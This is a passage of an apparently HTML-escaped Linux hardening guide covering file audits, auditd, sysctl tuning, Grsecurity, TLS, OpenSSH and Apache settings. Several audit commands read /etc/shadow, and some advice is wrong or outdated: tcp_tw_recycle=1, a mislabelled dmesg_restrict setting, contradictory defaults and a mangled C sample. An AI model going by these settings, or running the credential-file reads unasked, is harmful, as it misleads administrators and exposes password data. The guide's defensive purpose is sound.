 0x0000000000000018 (BIND_NOW)
&lt;/pre&gt;

&lt;p&gt;*) PIE&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Position-independent_code&quot;&gt;PIE&lt;/a&gt; enforces every process’s code segment is mmap()’d, it begins at a
different base address at each execution of the application.&lt;/p&gt;

&lt;p&gt;Note: mmap()’ is always used no matter what the type of the executable
is (PIE vs. non-PIE). For non-PIE binaries the kernel uses an internal
flag equivalent to MMAP_FIXED when mapping program headers.&lt;/p&gt;

&lt;p&gt;GCC option: -pie, it only work for sec mitigation when kernel enables
ASLR.&lt;/p&gt;
&lt;pre&gt;
no PIE: 
shawn@shawn-fortress ~ $ readelf -h a.out | grep &quot;Type:[[:space:]]*EXEC&quot; 
  Type:                              EXEC (Executable file) 

PIE: 
shawn@shawn-fortress ~ $ readelf -h a.out | grep &quot;Type:[[:space:]]*DYN&quot; 
  Type:                              DYN (Shared object file)
&lt;/pre&gt;

&lt;p&gt;These exploit mitigations provided by GCC will definitely increase the
cost of attackers. We all did believed so…until shit happened( as
always?). Hector Marco &lt;a href=&quot;http://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html&quot;&gt;released a method&lt;/a&gt; that can bypass NX/ASLR/PIE/CANARY mitigations locally/remotely
easily. After these years of debating and bragging about how secure of
GNU/Linux is/was and we finally ended up in*One mem infoleak can rule
the fuc*ing GNU/Linux*!!! Damn, PaX/Grsecurity will be our last hope
again, like a decade ago………..&lt;/p&gt;

&lt;h3 id=&quot;ld-sch00l-nix-file-auditing&quot;&gt;—-[ 2.2 0ld sch00l *nix file auditing&lt;/h3&gt;

&lt;p&gt;There are a bunch of files that could be exploited by attackers in the
specific scene. Fortunately, FOSS( Free &amp;amp; Open Source) community is
providing a lot of methods for the security audit work. They should be
a defender’s daily bread, which being part of defense-in-depth model.&lt;/p&gt;

&lt;p&gt;WildCards is a powerful feature in UNIX-like platform, but it can be
&lt;a href=&quot;http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt&quot;&gt;exploited&lt;/a&gt; by attackers:&lt;/p&gt;

&lt;pre&gt;find / -path /proc -prune  -name &quot;-*&quot;&lt;/pre&gt;

&lt;p&gt;World-writable file audit:&lt;/p&gt;

&lt;pre&gt;find / -path /proc -prune -o -perm -2 ! -type l -ls&lt;/pre&gt;

&lt;p&gt;World-readable file audit, correct permission: chmod 640 /var/log/:&lt;/p&gt;

&lt;pre&gt;find /var/log -perm -o=r ! -type l&lt;/pre&gt;

&lt;p&gt;Check if files were orphange:&lt;/p&gt;

&lt;pre&gt;find / -path /proc -prune -o -nouser -o -nogroup&lt;/pre&gt;

&lt;p&gt;List avaiable users, be cautions about who’s the “user”:&lt;/p&gt;
&lt;pre&gt;egrep -v '.*:\*|:\!' /etc/shadow | awk -F: '{print $1}'&lt;/pre&gt;

&lt;p&gt;Check which files belong to whom. Then delete the user correctly:&lt;/p&gt;

&lt;pre&gt;userdel -r account&lt;/pre&gt;

&lt;pre&gt;find / -path /proc -prune -o -user account -ls&lt;/pre&gt;

&lt;p&gt;List which users are unavailable:&lt;/p&gt;

&lt;pre&gt;grep -v ':x:' /etc/passwd&lt;/pre&gt;

&lt;p&gt;List expired passwords:&lt;/p&gt;

&lt;pre&gt;cat /etc/shadow | cut -d: -f 1,2 | grep '!'&lt;/pre&gt;

&lt;p&gt;The correct permission should be 644 at least. 600 would be better:&lt;/p&gt;

&lt;pre&gt;ls -l /boot&lt;/pre&gt;

&lt;p&gt;Files with suid or sgid flags:&lt;/p&gt;

&lt;pre&gt;find / -xdev -user root \( -perm -4000 -o -perm -2000 \)&lt;/pre&gt;

&lt;p&gt;Check if some stupid mistakes has been made( Thanks to Tim Brown):&lt;/p&gt;

&lt;pre&gt;objdump -x $i | grep -i path&lt;/pre&gt;

&lt;p&gt;Note: The main stream GNU/Linux distro( Debian, Gentoo, OpenSUSE,
CentOS) won’t have big chance to do stupid things, but it’s worth to
look at GNU/Linux platform with 3-rd party applications. Some
commercial applications may do something stuipid like this one:&lt;/p&gt;

&lt;p&gt;http://lists.openwall.net/bugtraq/2014/06/04/5&lt;/p&gt;

&lt;p&gt;—-[ 2.3 GNU/Linux’s auditd&lt;/p&gt;

&lt;p&gt;One particular scene is that some m41wares( or human attackers) might
be interested in change some file’s metadata for some *interesting*
reasons and then change it back to the original. Let’s show time:&lt;/p&gt;

&lt;p&gt;Install auditd and make sure its on boot startup:&lt;/p&gt;
&lt;pre&gt;#apt-get install auditd
#update-rc.d auditd enable&lt;/pre&gt;

&lt;p&gt;Config file:&lt;/p&gt;

&lt;pre&gt;/etc/audit/auditd.conf&lt;/pre&gt;

&lt;p&gt;Store log file:&lt;/p&gt;

&lt;pre&gt;log_file = /var/log/audit/audit.log&lt;/pre&gt;

&lt;p&gt;Add one policy to /etc/audit/audit.rules:&lt;/p&gt;

&lt;pre&gt;-w /home/shawn/change-test -p wa -k  identify&lt;/pre&gt;

&lt;p&gt;Use this test program to change the permission：&lt;/p&gt;

&lt;h1 id=&quot;include-stdioh&quot;&gt;include &amp;lt;stdio.h&amp;gt;&lt;/h1&gt;
&lt;p&gt;#include &amp;lt;sys/stat.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;&lt;/p&gt;

&lt;p&gt;int main(int argc, char *argv[])
{
	struct stat sb;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;if( stat(argv[1], &amp;amp;sb) == -1){
    perror(&quot;stat&quot;);
	exit(EXIT_FAILURE);
	}

	if( chmod(argv[1], sb.st_mode) == -1)
	{
		perror(&quot;stat&quot;);
			exit(EXIT_FAILURE);
			}
			return ; }
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;
shawn@shawn-fortress ~ $ gcc change.c
shawn@shawn-fortress ~ $ touch change-test
shawn@shawn-fortress ~ $ ./a.out change-test
&lt;/pre&gt;

&lt;p&gt;The date of  “Modify” and “Change” should be different:
shawn@shawn-fortress ~ $ stat change-test&lt;/p&gt;

&lt;p&gt;Check *who* did it:&lt;/p&gt;

&lt;p&gt;shawn@shawn-fortress ~ $ ausearch -i -k identify&lt;/p&gt;

&lt;h3 id=&quot;t00ls&quot;&gt;—-[ 2.4 T00ls&lt;/h3&gt;

&lt;p&gt;NMAP/OpenVAS/lynis/rkhunter/chkrootkit/metasploit/volatality/etc&lt;/p&gt;

&lt;p&gt;–[ 3. Kernel security&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Anti-DoS related:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;** SYN cookies is a syn flood attack protection, the default is enable( 1)：&lt;/p&gt;
&lt;pre&gt;
net.ipv4.tcp_syncookies = 1
/proc/sys/net/ipv4/tcp_syncookies

(optional)，if your kernel support SYNPROXY：
iptables -t raw -A PREROUTING -i eth0 -p tcp --dport 80 --syn -j NOTRACK
iptables -A INPUT -i eth0 -p tcp --dport 80 -m state UNTRACKED,INVALID \
	 -j SYNPROXY --sack-perm --timestamp --mss 1480 --wscale 7 --ecn

echo 0 &amp;gt; /proc/sys/net/netfilter/nf_conntrack_tcp_loose

Note: SYNPROXY has been added into vanilla kernel in 3.13.
&lt;/pre&gt;

&lt;p&gt;** TCP FIN-WAIT-2 status lifetime, it’d be an DoS attack risk if
the value is too big. It’d be cause remote machine doesn’t have enough
time to close the connection if the value is too small. Default is 60(
seconds). 15 is better, you think? &lt;a href=&quot;http://benohead.com/tcp-about-fin_wait_2-time_wait-and-close_wait/&quot;&gt;Further reading&lt;/a&gt;:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_fin_timeout = 15
/proc/sys/net/ipv4/tcp_fin_timeout
&lt;/pre&gt;

&lt;p&gt;** SYN queue length, the bigger value can handle more connections, the
  default is 1024:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_max_syn_backlog = 8192
/proc/sys/net/ipv4/tcp_max_syn_backlog
&lt;/pre&gt;

&lt;p&gt;** Device queue length, this value should be bigger than syn queue?
   The default is 1000&lt;/p&gt;

&lt;pre&gt;
net.core.netdev_max_backlog = 16384
/proc/sys/net/core/netdev_max_backlog
&lt;/pre&gt;

&lt;p&gt;** listen()’s backlog, the default is 128:&lt;/p&gt;

&lt;pre&gt;
net.core.somaxconn = 4096
/proc/sys/net/core/somaxconn
&lt;/pre&gt;

&lt;p&gt;** TIME_WAIT status TCP connections, the system will empty the
   connection if the number is exceed the value,&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_max_tw_buckets = 65535
/proc/sys/net/ipv4/tcp_max_tw_buckets
&lt;/pre&gt;

&lt;p&gt;** TIME-WAIT status can be reuse, the default is disable( 0):&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_tw_reuse = 1
/proc/sys/net/ipv4/tcp_tw_reuse
&lt;/pre&gt;

&lt;p&gt;** fast recycle of TIME-WAIT status connection, the default is disable( 0):&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_tw_recycle = 1
/proc/sys/net/ipv4/tcp_tw_recycle
&lt;/pre&gt;

&lt;p&gt;** TCP KEEPALIVE probe frequency,the default is 7,200 seconds:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_keepalive_time = 300
/proc/sys/net/ipv4/tcp_keepalive_time
&lt;/pre&gt;

&lt;p&gt;** TCP KEEPALIVE probe packets, the default is 9:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_keepalive_probes = 3
/proc/sys/net/ipv4/tcp_keepalive_probes
&lt;/pre&gt;

&lt;p&gt;** how many times of SYN and SYN+ACK can be re-transimit, the default is 5:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_syn_retries = 3
/proc/sys/net/ipv4/tcp_syn_retries

net.ipv4.tcp_synack_retries = 3 
/proc/sys/net/ipv4/tcp_synack_retries
&lt;/pre&gt;

&lt;p&gt;** the bigger value of TCP ORPHAN would prevent simple DoS attack,
   each ORPHAN cost 64KB memory, so 65535 is about 4GB:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_max_orphans = 65536
/proc/sys/net/ipv4/tcp_max_orphans
&lt;/pre&gt;

&lt;p&gt;** How many pages( 4KB each page in x86) can be used in TCP connection:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_mem = 131072 196608 262144
/proc/sys/net/ipv4/tcp_mem
&lt;/pre&gt;

&lt;p&gt;Be careful about this one, it’d be triggered OOM if the TCP connection
consume all pages.&lt;/p&gt;

&lt;p&gt;** The maximum send and receive window, you can set 64MB for a 10G NIC:&lt;/p&gt;

&lt;pre&gt;
net.core.rmem_max = 67108864
/proc/sys/net/core/rmem_max

net.core.wmem_max = 67108864
/proc/sys/net/core/wmem_max
&lt;/pre&gt;

&lt;p&gt;** Each TCP connection’s read buffer( X bytes):&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_rmem = 4096 8192 16777216( 4096 87380 33554432)
/proc/sys/net/ipv4/tcp_rmem

net.ipv4.tcp_wmem = 4096 8192 16777216( 4096 65536 33554432)
/proc/sys/net/ipv4/tcp_wmem
&lt;/pre&gt;

&lt;p&gt;If default paging 8kb * 2 = 16kb/connection, 4GB memory can be used for:
(4 * 1024 * 1024) / 16 = 262144&lt;/p&gt;

&lt;p&gt;Oracle DB server’s &lt;a href=&quot;http://www.dba-oracle.com/t_linux_networking_kernel_parameters.htm&quot;&gt;best practice&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Networking&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ref:
https://www.suse.com/documentation/sles11/singlehtml/book_hardening/book_hardening.html&lt;/p&gt;

&lt;p&gt;** Source Routing is used to specify a path or route through the
network from source to destination. This feature can be used by
network people for diagnosing problems. However, if an intruder was
able to send a source routed packet into the network, then he could
intercept the replies and your server might not know that it’s not
communicating with a trusted server.&lt;/p&gt;

&lt;pre&gt;
net.ipv4.conf.all.accept_source_route = 0
/proc/sys/net/ipv4/conf/all/accept_source_route
&lt;/pre&gt;

&lt;p&gt;** ICMP redirects are used by routers to tell the server that there is
   a better path to other networks than the one chosen by the
   server. However, an intruder could potentially use ICMP redirect
   packets to alter the hosts’s routing table by causing traffic to
   use a path you didn’t intend.&lt;/p&gt;

&lt;pre&gt;
net.ipv4.conf.all.accept_redirects = 0
/proc/sys/net/ipv4/conf/all/accept_redirects
&lt;/pre&gt;

&lt;p&gt;** Turn it off if this is not a router：&lt;/p&gt;

&lt;pre&gt;
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0

/proc/sys/net/ipv4/conf/all/send_redirects
/proc/sys/net/ipv4/conf/default/send_redirects
&lt;/pre&gt;

&lt;p&gt;** IP spoofing protection, the default is disabled( 0)：&lt;/p&gt;
&lt;pre&gt;
net.ipv4.conf.all.rp_filter = 1
/proc/sys/net/ipv4/conf/all/rp_filter
&lt;/pre&gt;

&lt;p&gt;** If you want to ignore all ICMP package, you can enable it. The
   default is disabled( 0):&lt;/p&gt;

&lt;pre&gt;
net.ipv4.icmp_echo_ignore_all = 1
/proc/sys/net/ipv4/icmp_echo_ignore_all
&lt;/pre&gt;

&lt;p&gt;** Ignore ICMP broadcast, the default is enabled( 1):&lt;/p&gt;

&lt;pre&gt;
net.ipv4.icmp_echo_ignore_broadcasts = 1
/proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
&lt;/pre&gt;

&lt;p&gt;** To alert you about bad message, the default is disabled( 1):&lt;/p&gt;

&lt;pre&gt;
net.ipv4.icmp_ignore_bogus_error_responses = 1
/proc/sys/net/ipv4/icmp_ignore_bogus_error_responses
&lt;/pre&gt;

&lt;p&gt;** To turn on logging for Spoofed Packets, Source Routed Packets, and
   Redirect Packets, the default is disabled( 0):&lt;/p&gt;

&lt;pre&gt;
/proc/sys/net/ipv4/conf/all/log_martians
net.ipv4.conf.all.log_martians = 1
&lt;/pre&gt;

&lt;h2 id=&quot;exploit-mitigation&quot;&gt;Exploit mitigation&lt;/h2&gt;
&lt;p&gt;** Randomize the memory area. 0: disable ASLR. 1: Randomize the stack,
   VDSO page, shared memory regions. 2: (1) + also randomize the data
   segment.&lt;/p&gt;

&lt;pre&gt;
kernel.randomize_va_space=2
/proc/sys/kernel/randomize_va_space
&lt;/pre&gt;

&lt;p&gt;** Not allow the user to read kernel address symbol tables:&lt;/p&gt;
&lt;pre&gt;
kernel.kptr_restrict=1
/proc/sys/kernel/kptr_restrict
&lt;/pre&gt;

&lt;p&gt;** dmesg info can be read by root-only:&lt;/p&gt;
&lt;pre&gt;
kernel.kptr_restrict=1
/proc/sys/kernel/dmesg_restrict
&lt;/pre&gt;

&lt;p&gt;** the minimal memory map address, 65536 is good at least:&lt;/p&gt;
&lt;pre&gt;
vm.mmap_min_addr=65536
/proc/sys/vm/mmap_min_addr
&lt;/pre&gt;

&lt;p&gt;** Now allow the debugger trace the process by ptrace. The current
   Debian stable kernel doesn’t have this feature. 0: All process can
   be debugged. 1: Only one father process can be debugged. 2: Only
   &lt;em&gt;root&lt;/em&gt; can do debug( with CAP_SYS_PTRACE) 3: no process can be
   debugged&lt;/p&gt;
&lt;pre&gt;
kernel.yama.ptrace_scope = 2
/proc/sys/kernel/yama/ptrace_scope
&lt;/pre&gt;

&lt;h3 id=&quot;apparmor&quot;&gt;—-[ 3.1 Apparmor&lt;/h3&gt;

&lt;p&gt;Why Apparmor? It’s easy to deploy. More importantly, it’s easy to
audit the polices. Everyone can write your own MAC/RBAC
policy. Debian/OpenSuSE shipped with Apparmor by default.&lt;/p&gt;

&lt;p&gt;Install Apparmor and MAC polices from community:
#apt-get install -y apparmor-profiles apparmor&lt;/p&gt;

&lt;p&gt;Check the status:
#aa-status&lt;/p&gt;

&lt;h3 id=&quot;selinux&quot;&gt;—-[ 3.2 SELinux&lt;/h3&gt;

&lt;p&gt;S0rry. I barely use SELinux for reasons. The 1st one is I don’t trust
NSA, even the source code is GPL’ed. NSA is professional about
&lt;em&gt;implant&lt;/em&gt; backdoors, which would be very hard to audit. People has
been discussing it for years:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.schneier.com/blog/archives/2008/04/nsas_linux.html&quot;&gt;NSA SELinux&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.zerohedge.com/news/2013-07-09/nsa-has-inserted-its-code-android-os-bugging-three-quarters-all-smartphones&quot;&gt;NSA has inserted its code into Android&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.eteknix.com/nsa-has-code-running-in-the-linux-kernel-and-android/&quot;&gt;NSA linux/android kernel&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sebastian Krahmer found a &lt;a href=&quot;https://github.com/stealth/troubleshooter&quot;&gt;exploitable bug&lt;/a&gt; from SELinux recently. It looks like a backdoor more than a “vulnerablity”, isn’t it?;-)
Another important reason people don’t like SELinux because it’s hard
to use and cause other application troubles from time to time. &lt;a href=&quot;http://stopdisablingselinux.com/&quot;&gt;Stop
disabling SELinux&lt;/a&gt; movement won’t work in the near future:&lt;/p&gt;

&lt;p&gt;S0rry, Mr.Walsh. It’s nothing personal:-)&lt;/p&gt;

&lt;h3 id=&quot;mempo-kernel&quot;&gt;—-[ 3.3 Mempo kernel&lt;/h3&gt;

&lt;p&gt;”“⌘ Mempo project aims to provide most secure and yet comfortable
out-of-the-box Desktop and Server computer, for professionals,
business, journalists, and every-day users avoiding PRISM-like
spying. ⌘”&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://wiki.debian.org/Mempo&quot;&gt;Mempo&lt;/a&gt; is a FLOSS project for protect user’s digital freedom. Let the
massive surveillance cry;-)&lt;/p&gt;

&lt;p&gt;The Debian Mempo repo is not working for the internet user now and
it’ll be back soon. So I’ll write how to use PaX/Grsecurity from
offical Mempo repository on Debian.&lt;/p&gt;

&lt;h3 id=&quot;paxgrsecurity&quot;&gt;—-[ 3.3.1 PaX/Grsecurity&lt;/h3&gt;

&lt;p&gt;PaX/Grsecurity is the cutting-edge kernel protection in past 14
years. But they don’t have the credit what they supposed to
have. Almost every main stream OS kernel security mechanism has
influenced by PaX/Grsecurity in past decade. Lionel tells a &lt;a href=&quot;http://www.openwall.com/lists/oss-security/2014/12/06/14&quot;&gt;little story&lt;/a&gt; about PaX/Grsecurity better than myself:&lt;/p&gt;

&lt;p&gt;PaX/Grsecurity treat the kernel security as a whole. They’ve been
inventing many innovations( SEGMEXEC, PAGEEXEC, MPROTECT, UDEREF,
RANDSTRUCT&lt;em&gt;, etc), while hardening the kernel in source code level(
make important *struct&lt;/em&gt; read-only, etc). PaX/Grsecurity is one of most
respected 0ld sch00l hacker community. The main contributor( Spender)
was even been through a &lt;a href=&quot;http://developers.slashdot.org/story/04/05/31/1949241/end-of-development-for-grsecurity-announced&quot;&gt;very badly economic situation&lt;/a&gt; back in 2004&lt;/p&gt;

&lt;p&gt;Thanks to the G0d of techn0logy, PaX/Grsecurity is still alive…. I
personally agree with some ideas:&lt;/p&gt;

&lt;hr /&gt;
&lt;p&gt;“The “better than none” point of view is actually a nice way to false
sense of security for those who don’t know better. We got
better-than-none apparmor, selinux, tomoyo, some poorly maintained and
crippled ports of grsec features or alikes, namespaces and containers,
rootkit-friendly LSM, the dumb and useless kernel version of SSP,
etc. What’s the sum of all this shit for end users? False sense of
security…”&lt;/p&gt;

&lt;p&gt;“without Grsecurity/PaX, linux security is like monkey can never
perform a regular masturbation cu’z lacking of giant pennis;-)”
———————————————————————–&lt;/p&gt;

&lt;p&gt;Too many better-than-none product or solutions, which only makes you
feel safe, maybe for a while. Feel safe is not equal to
secure. Fuc*ing cargo cult shitty security only makes things worse.&lt;/p&gt;

&lt;p&gt;I’ll show you how to install PaX/Grsecurity manually( still waiting
Mempo back online):&lt;/p&gt;

&lt;p&gt;** &lt;a href=&quot;https://www.kernel.org/pub/linux/kernel/v3.x/&quot;&gt;Download kernel&lt;/a&gt; ( Pick one)：
https://www.kernel.org/pub/linux/kernel/v3.x/&lt;/p&gt;

&lt;p&gt;** Download &lt;a href=&quot;https://grsecurity.net/download.php&quot;&gt;PaX/Grsecurity patch&lt;/a&gt; ( you can download the latest version
   from )：&lt;/p&gt;

&lt;p&gt;** Decompress the kernel and patch the kernel with grsecurity:&lt;/p&gt;
&lt;pre&gt;
xz -d linux-*.tar.xz
tar xvf linux-*.tar
cd linux-*/
patch -p1 &amp;lt; ../grsecurity-*.patch
&lt;/pre&gt;

&lt;p&gt;** Do “make menuconfig” to customize your kernel, or you can use &lt;a href=&quot;https://raw.githubusercontent.com/citypw/citypw-SCFE/master/security/apparmor_test/debian-7.4-linux-3.14.1-grsec.config&quot;&gt;my test config&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;** Compile&lt;/p&gt;
&lt;pre&gt;
make -j7 deb-pkg
&lt;/pre&gt;

&lt;p&gt;** Install the new kernel&lt;/p&gt;
&lt;pre&gt;
dpkg -i ../*.deb
&lt;/pre&gt;

&lt;h2 id=&quot;crypto&quot;&gt;–[ 4. Crypto&lt;/h2&gt;

&lt;p&gt;“Encryption works. Properly implemented strong crypto systems are one
of the few things that you can rely on. Unfortunately, endpoint
security is so terrifically weak that NSA can frequently find ways
around it.”   — Edward Snowden&lt;/p&gt;

&lt;p&gt;Damn, we should treat the crypto engineering very carefully. Because
it may be the last outter-heaven we have;-)&lt;/p&gt;

&lt;p&gt;—-[ 4.1 SSL/TLS Checklist&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.exploresecurity.com/wp-content/uploads/custom/SSL_manual_cheatsheet.html&quot;&gt;Very good writing&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;SSL/TLS has been through BEAST/CRIME/LUCKY-13/HEARTBLEED/POODLE in
past few years. and it’s already become one of hottest topic in cyber
security. There are a set of vulnerable protocols and ciphersuites are
worth to do audit. There are a few open source tools would make your
audit work easier. Try this one:&lt;/p&gt;

&lt;pre&gt;
#apt-get install sslscan


SSLv2 should be disabled:
openssl s_client -ssl2 -connect www.google.com:443

OpenSSL 1.0 no longer support SSLv2. So you can use GnuTLS do the
check:

gnutls-cli -d 5 -p 443 --priority &quot;NORMAL:-VERS-TLS1.2:-VERS-TLS1.1:-VERS-TLS1.0:-VERS-SSL3.0&quot; www.google.com
&lt;/pre&gt;

&lt;p&gt;FREAK:&lt;/p&gt;
&lt;pre&gt;
openssl s_client -cipher EXPORT -connect www.google.com:443
&lt;/pre&gt;

&lt;p&gt;If succeed, it’s risk to FREAK.&lt;/p&gt;

&lt;p&gt;—-[ 4.2 OpenSSH&lt;/p&gt;

&lt;p&gt;Config file：/etc/ssh/ssh_config&lt;/p&gt;

&lt;pre&gt;
1, known_hosts stores server's signature, so hash the host name:

HashKnownHosts yes

2, SSH protocl version 1 is not secure:

Protocol 2

3, If you don't use X11 forwarding, plz disable it&quot;

X11Forwarding no

4, Disable rhosts:

IgnoreRhosts yes

5, Not allow empty password:

PermitEmptyPasswords no

6, Maxisum tries:

MaxAuthTries 5

7, Now allow root login:

PermitRootLogin no


(Optional)
1, disable password auth, enable pubkey auth:

PubkeyAuthentication yes

PasswordAuthentication no


2，Allow or deny users/groups

AllowGroups, AllowUsers, DenyUsers, DenyGroups
&lt;/pre&gt;

&lt;h3 id=&quot;openssh-in-post-prism-era&quot;&gt;——[ 4.2.1 OpenSSH in post-prism era&lt;/h3&gt;

&lt;p&gt;Well, plz &lt;a href=&quot;https://stribika.github.io/2015/01/04/secure-secure-shell.html&quot;&gt;read this&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;ciphersuites-in-apache2nginx&quot;&gt;—-[ 4.2 Ciphersuites in Apache2/Nginx&lt;/h3&gt;

&lt;p&gt;The explanation is &lt;a href=&quot;https://hynek.me/articles/hardening-your-web-servers-ssl-ciphers/&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Apache:
SSLProtocol ALL -SSLv2 -SSLv3
SSLHonorCipherOrder On
SSLCipherSuite ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+3DES:DH+3DES:RSA+AESGCM:RSA+AES:RSA+3DES:!aNULL:!MD5:!DSS&lt;/p&gt;

&lt;p&gt;Nginx:
ssl_prefer_server_ciphers On;
ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
ssl_ciphers ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+3DES:DH+3DES:RSA+AESGCM:RSA+AES:RSA+3DES:!aNULL:!MD5:!DSS&lt;/p&gt;

&lt;p&gt;–[ 5. Web security&lt;/p&gt;

&lt;p&gt;You’re not reading this article for learning pentest, are you? Let’s
just consider the fence of defender’s;-)&lt;/p&gt;

&lt;p&gt;OWASP code review:
https://www.owasp.org/images/2/2e/OWASP_Code_Review_Guide-V1_1.pdf
https://www.owasp.org/index.php/OWASP_Code_review_V2_Project&lt;/p&gt;

&lt;p&gt;OWASP testing guide:
https://www.owasp.org/images/5/52/OWASP_Testing_Guide_v4.pdf
https://www.owasp.org/index.php/OWASP_Guide_Project&lt;/p&gt;

&lt;p&gt;—-[ 5.1 Web server( Apache/Nginx ?)&lt;/p&gt;

&lt;p&gt;ServerRoot&lt;/p&gt;
&lt;pre&gt;
Web server's root path. Default is &quot;/etc/httpd&quot;. It's import to keep
track of its permission. Recommend: Do not allow none-root user has
the permission to modify it.

chown root:root /etc/httpd
chmod 754 /etc/httpd
&lt;/pre&gt;

&lt;p&gt;Timeout&lt;/p&gt;
&lt;pre&gt;
Lifetime per session. Default is 60 seconds. Set the lower value for
mitigating DoS attack. Recommend: 15 &amp;lt;= X &amp;lt;= 30
&lt;/pre&gt;

&lt;p&gt;KeepAlive&lt;/p&gt;
&lt;pre&gt;
Persistent session. Default is “Off”. Recommend: On
&lt;/pre&gt;

&lt;p&gt;User&lt;/p&gt;
&lt;pre&gt;
Decide which user Apache work process running as. Recommend: nobody
&lt;/pre&gt;

&lt;p&gt;Group&lt;/p&gt;
&lt;pre&gt;
Decide which group Apache work process running as. Recommend: nobody
&lt;/pre&gt;

&lt;p&gt;Blacklist/whitelist IP/networks&lt;/p&gt;
&lt;pre&gt;
Order Deny,Allow
Deny from all
Allow from 176.16.0.0/16

Or by IP:

Order Deny,Allow
Deny from all
Allow from 127.0.0.1
&lt;/pre&gt;

&lt;p&gt;Blacklist/whitelist web contents&lt;/p&gt;
&lt;pre&gt;
It can prevent malicious attack via web content.

&amp;lt; Directory /&amp;gt;
Order Deny,Allow # Default is Allow
Deny from all  # Deny all contents
&amp;lt; /Directory&amp;gt;
&lt;/pre&gt;

&lt;p&gt;Options FollowSymLinks&lt;/p&gt;
&lt;pre&gt;
Do not list any other files if the visited file don't exit.
&lt;/pre&gt;

&lt;p&gt;Hide info&lt;/p&gt;
&lt;pre&gt;
ServerSignature:
* Off, do not provide any information
* On, provide Apache infomation

ServerTokens:
* Full, exposure all information
* Prod, only provide server name
&lt;/pre&gt;

&lt;p&gt;Limit risky HTTP methods&lt;/p&gt;
&lt;pre&gt;
&amp;lt; Directory /&amp;gt;
&amp;lt; LimitExcept GET POST&amp;gt;
Deny from all
&amp;lt; /LimitExcept&amp;gt;
&amp;lt; /Directory&amp;gt;

PUT/DELETE/etc methods won't be available.
&lt;/pre&gt;

&lt;p&gt;MinSpareServers&lt;/p&gt;
&lt;pre&gt;
Minimal spare processes. Default is 5. Recommend: 32.
&lt;/pre&gt;

&lt;p&gt;MaxSpareServers&lt;/p&gt;
&lt;pre&gt;
Maximum spare processes. Default is 20. Recommend: 64.
&lt;/pre&gt;

&lt;p&gt;ServerLimit&lt;/p&gt;
&lt;pre&gt;
The number that MaxClients can't not exceed.
&lt;/pre&gt;

&lt;p&gt;MaxClients&lt;/p&gt;
&lt;pre&gt;
The maximum number of working processes. Default is 256. Recommend:
8192.

MaxClients = (RAM available to Apache) / (RAM per Apache process)

RAM per Apache process:
#ps -ylC httpd --sort:rss

Example:
64GB physical memory * 0.8 = RAM available to Apache
HTML &amp;lt;= 5MB per process, PHP &amp;lt;= 15MB per processe
php: MaxClients = 65536MB / 15MB =4369
&lt;/pre&gt;

&lt;p&gt;MaxRequestsPerChild&lt;/p&gt;
&lt;pre&gt;
Limit on the number of requests that an individual child server will
handle during its life. Default is 4000. Recommend: 1500.
&lt;/pre&gt;

&lt;p&gt;—-[ 5.2 WAF&lt;/p&gt;

&lt;p&gt;ModSecurity is an open source, cross-platform web application firewall
(WAF) module. Known as the “Swiss Army Knife” of WAFs, it enables web
application defenders to gain visibility into HTTP(S) traffic and
provides a power rules language and API to implement advanced
protections. The web malicious signatures( including OWASP Top 10) are
maintained by ModSecurity community. You can &lt;a href=&quot;https://www.digitalocean.com/community/tutorials/how-to-set-up-mod_security-with-apache-on-debian-ubuntu&quot;&gt;deploy it on Debian&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Anti-DoS: &lt;a href=&quot;https://www.linode.com/docs/websites/apache-tips-and-tricks/modevasive-on-apache&quot;&gt;mod_evasive&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;About anti DoS solution, I personally don’t get used to
mod_evasive. Iptables would be much easier to maintain, eg:&lt;/p&gt;
&lt;pre&gt;
iptables -I INPUT -p tcp -m multiport --dports 80,443 -i eth0 -m state --state NEW -m recent --set
iptables -I INPUT -p tcp -m multiport --dports 80,443 -i eth0 -m state --state NEW -m recent --update --seconds 30 --hitcount 5 -j DROP
&lt;/pre&gt;

&lt;p&gt;–[ 6. Security standard&lt;/p&gt;

&lt;p&gt;Well, there are a bunch of crazy security standards in the
planet. Some are compliance in some contries. FIPS-140-2/3, CC( EAL 7?
damn, it’d be an incarnation of the organge book;-)), PCI-DSS are very
